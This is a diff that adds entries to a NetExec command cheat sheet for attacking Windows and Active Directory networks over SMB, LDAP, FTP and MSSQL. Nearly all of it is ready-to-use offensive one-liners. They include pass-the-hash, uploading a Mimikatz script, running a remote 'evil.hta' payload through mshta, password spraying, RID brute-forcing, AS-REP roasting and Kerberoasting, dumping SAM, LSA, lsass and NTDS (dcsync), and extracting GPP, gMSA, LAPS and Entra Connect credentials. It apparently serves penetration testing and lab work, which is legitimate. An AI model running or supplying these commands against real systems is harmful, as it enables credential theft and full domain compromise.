@@ -18,7 +18,7 @@ nxc smb <ip> -u 'anonymous' -p '' --local-auth
 # SMB Share Guest session
 nxc smb <ip> -u 'guest' -p ''
 # SMB Share Authenticated session
-nxc smb <ip> -u '<username>' -p '<password>'
+nxc smb <ip> -u '<username>' -p '<password>'  # or -H '<hash>'
 
 
 ## Spider SMB shares
@@ -42,6 +42,21 @@ nxc smb <ip> -u 'guest' -p '' -M spider_plus -o DOWNLOAD_FLAG=true OUTPUT_FOLDER
 nxc smb <ip> -u '<username>' -p '<password>' -M spider_plus -o DOWNLOAD_FLAG=true OUTPUT_FOLDER=.
 
 
+# NetExec SMB Put file on remote
+nxc smb <ip> -u '<username>' -p '<password>' --put-file /workspace/Invoke-Mimi.ps1 \\users\\public\\Invoke-Mimi.ps1
+
+# NetExec SMB Get file from remote
+nxc smb <ip> -u '<username>' -p '<password>' --get-file \\users\\public\\File.docx /workspace/File.docx
+
+
+# Save a list of relays (SMB signing = False)
+nxc smb <ip> --gen-relay-list relay-list.txt
+
+
+# Execute Command or file
+nxc smb <ip> -u '<username>' -p '<password>' -x 'mshta.exe http://<ip>/evil.hta'
+
+
 ## Enumerating Password Policy
 
 # Password Policy NULL session
@@ -54,16 +69,32 @@ nxc smb <ip> -u 'guest' -p '' --pass-pol
 nxc smb <ip> -u '<username>' -p '<password>' --pass-pol
 
 
+## Password spraying:
+nxc smb <ip> -u userfile -p passwordfile # optional --continue-on-success --no-bruteforce
+
+
 ## Enumerating Users
 
 # Enumerate Users NULL session
 nxc smb <ip> -u '' -p '' --users
+nxc ldap <ip> -u '' -p '' --users
 # Enumerate Users Anonymous session
 nxc smb <ip> -u 'anonymous' -p '' --local-auth --users
+nxc ldap <ip> -u 'anonymous' -p '' --local-auth --users
 # Enumerate Users Guest session
 nxc smb <ip> -u 'guest' -p '' --users
+nxc ldap <ip> -u 'guest' -p '' --users
 # Enumerate Users Authenticated session
 nxc smb <ip> -u '<username>' -p '<password>' --users
+nxc ldap <ip> -u '<username>' -p '<password>' --users
+
+# Enumerate users by bruteforcing the RID + save users list (the 10000 is optinal)
+nxc smb <ip> -u guest -p '' --rid-brute 10000 --log rid-brute.txt
+# Enumerate Logged-On Users
+nxc smb <ip> -u '<username>' -p '<password>' --loggedon-users
+
+# Get user's description
+nxc ldap <ip> -u '<user>' -p '<pass>' -M get-desc-users
 
 
 ## Enumerating Groups
@@ -76,3 +107,56 @@ nxc smb <ip> -u 'anonymous' -p '' --local-auth --groups
 nxc smb <ip> -u 'guest' -p '' --groups
 # Enumerate Groups Authenticated session
 nxc smb <ip> -u '<username>' -p '<password>' --groups
+
+
+## FTP
+
+nxc ftp <ip> -u '<username>' -p '<password>' --ls
+nxc ftp <ip> -u '<username>' -p '<password>' --ls '<Folder>'
+nxc ftp <ip> -u '<username>' -p '<password>' --ls '<Folder>' --get '<File>'
+
+
+# Asreproast- Get and try cracking user account hash
+nxc ldap <ip> -u '<username>' -p '' --asreproast asreproast.txt --kdcHost <ip>
+
+# Kerberoasting - Get and try cracking SPN account hash
+nxc ldap <ip> -u '<username>' -p '<password>' --kerberoasting kerberoasting.txt --kdcHost <ip>
+
+
+# ldap query
+nxc ldap <ip> -u '' -p '' --query "(objectclass=*)" ""
+nxc ldap <ip> -u '' -p '' --query "(sAMAccountName=<username>)" ""
+
+
+## Passwords
+# Extract the SAM File + Dump Cached Passwords
+nxc smb <ip> -u '<username>' -p '<password>' --sam --lsa --dpap
+# Dump lsass with lsassy module:
+nxc smb <ip> -u '<username>' -p '<password>' -M lsassy -o METHOD=comsvcs_stealth
+# Extract passwords from the NTDS (dcsync)
+nxc smb <ip> -d <domain> -u '<username>' -p '<password>' --ntds
+
+## Get GPP policies
+# `gpp_password` decrypts passwords stored in the Group.xml file
+nxc smb <dc-ip> -u '' -p '' -M gpp_password
+# `gpp_autologin` retrieves autologin information from the Registry.xml file
+nxc smb <dc-ip> -u '' -p '' -M gpp_autologin
+
+## Group Managed Service Accounts (gMSA)
+# Requirements: user that can read msDS-ManagedPassword (Domain Admins cant read it by defualt)
+nxc ldap <ip> -u '<username>' -p '<password>' --gmsa
+
+## LAPS (Local administrator password solution) - retrieves both LAPS v1 and v2 passwords
+# Requirements: Domain Admins or user that have Read/WriteProperty to the ms-MCS-AdmPwd attribute
+nxc smb <ip> -u '<username>' -p '<password>' --laps    # add --lsa use the laps admin to dump lsa
+
+## Azure - Entra Connect Sync service username looks like 'MSOL_16fb75d0227d'
+# Requirements: 'ADSyncAdmins' or 'local Administrators groups' on machine with AD Connect service to get the MSOL account password and dcsync with it
+nxc smb <ip> -u '<username>' -p '<password>' -M msol
+# or
+nxc smb <ip> -u '<username>' -p '<password>' -M msol -o MSOL_PS1=C:\...\nxc\data\msol_dump\msol_dump.ps1
+
+
+## mssql_priv
+nxc mssql <ip> -u '<username>' -p '<password>' -M mssql_priv
+nxc mssql <ip> -u '<username>' -p '<password>' -M mssql_priv -o ACTION=privesc
